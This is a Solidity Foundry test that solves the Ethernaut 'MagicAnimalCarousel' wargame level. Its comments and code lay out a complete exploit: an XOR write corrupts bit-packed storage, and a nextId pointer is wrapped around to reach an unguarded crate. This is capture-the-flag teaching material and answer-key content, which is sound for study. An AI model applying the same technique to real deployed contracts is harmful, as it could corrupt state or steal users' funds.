// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test, console} from "forge-std/Test.sol";
import {MagicAnimalCarousel} from "../src/levels/MagicAnimalCarousel.sol";

/// Ethernaut "MagicAnimalCarousel" → bit-packing corruption via XOR write + nextId pointer abuse.
/// (catalog: arithmetic/bit-encoding gap.)
///
/// Crate layout (uint256): [255..176] animal (80b) · [175..160] nextId (16b) · [159..0] owner (160b).
/// `setAnimalAndSpin` writes the animal with `^` (XOR) onto `carousel[nextCrateId]`, keeping that
/// crate's existing animal bits. So if the validator's "Goat" spin lands on a crate that ALREADY
/// holds animal bits, the stored animal becomes `existing ^ Goat != Goat` → win
/// (`validateInstance` checks `carousel(currentCrateId) >> 176 != Goat`).
///
/// The trick: make the validator spin from a crate whose `nextId` points to crate 0 (which we
/// pre-fill with animal bits). `changeAnimal` only ORs into the nextId field (can't point
/// "backward"), so we use the `(nextCrateId+1) % MAX_CAPACITY` wrap: route a spin through crate
/// 65534, whose stored nextId wraps to 0. Crate 0 has no owner (constructor only set its nextId),
/// so `changeAnimal(.,0)` is unguarded.
///
/// Sequence:
///   1. setAnimalAndSpin("A1")          // fill crate 1 (nextId=2, owner=player), currentCrateId=1
///   2. changeAnimal(name1, 1)          // name1 low-16 = 0xFFFE → nextId = 0xFFFE|2 = 65534
///   3. setAnimalAndSpin("A2")          // target 65534; its nextId wraps to (65535 % 65535)=0; cur=65534
///   4. changeAnimal("Zz", 0)           // crate 0 (unguarded) gets nonzero animal bits
///   5. [validator] setAnimalAndSpin("Goat") // targets crate 0 → XOR corrupts → win
contract MagicAnimalCarouselTest is Test {
    MagicAnimalCarousel instance;

    function setUp() public {
        instance = new MagicAnimalCarousel();
    }

    /// A 12-byte name whose encodeAnimalName() low-16 bits equal `lo` and that has nonzero animal bits.
    /// encodeAnimalName packs name bytes big-endian into a 96-bit value: low-16 = (name[10]<<8)|name[11].
    function _name(bytes1 b0, uint16 lo) internal pure returns (string memory) {
        bytes memory nm = new bytes(12);
        nm[0] = b0; // contributes to the animal field (nonzero)
        nm[10] = bytes1(uint8(lo >> 8));
        nm[11] = bytes1(uint8(lo));
        return string(nm);
    }

    function test_solve_magic_animal_carousel() public {
        // Sanity-check the byte→field mapping before relying on it.
        string memory name1 = _name(0x41, 0xFFFE); // 'A' + low16 0xFFFE
        assertEq(instance.encodeAnimalName(name1) & 0xFFFF, 0xFFFE, "low-16 maps to nextId field");

        // 1. fill crate 1
        instance.setAnimalAndSpin("A1");
        assertEq(instance.currentCrateId(), 1, "currentCrateId is 1 after first spin");

        // 2. redirect crate 1's nextId to 65534 (0xFFFE | existing 2 == 0xFFFE)
        instance.changeAnimal(name1, 1);
        uint256 crate1 = instance.carousel(1);
        assertEq((crate1 >> 160) & 0xFFFF, 0xFFFE, "crate 1 nextId now 65534");

        // 3. spin into 65534; its stored nextId wraps to 0
        instance.setAnimalAndSpin("A2");
        assertEq(instance.currentCrateId(), 65534, "currentCrateId is 65534");
        assertEq((instance.carousel(65534) >> 160) & 0xFFFF, 0, "crate 65534 nextId wrapped to 0");

        // 4. pre-fill crate 0 with animal bits (unguarded: crate 0 has no owner)
        instance.changeAnimal("Zz", 0);
        assertTrue(instance.carousel(0) >> 176 != 0, "crate 0 has animal bits");

        // 5. mirror the factory's validateInstance: spin a Goat (lands on crate 0 via the wrap)
        instance.setAnimalAndSpin("Goat");

        // win condition (verbatim from MagicAnimalCarouselFactory.validateInstance)
        uint256 currentCrateId = instance.currentCrateId();
        uint256 animalInBox = instance.carousel(currentCrateId) >> 176;
        uint256 goatEnc = uint256(bytes32(abi.encodePacked("Goat"))) >> 176;
        assertEq(currentCrateId, 0, "Goat spin landed on the pre-filled crate 0");
        assertTrue(animalInBox != goatEnc, "stored animal corrupted by XOR != Goat");
    }
}
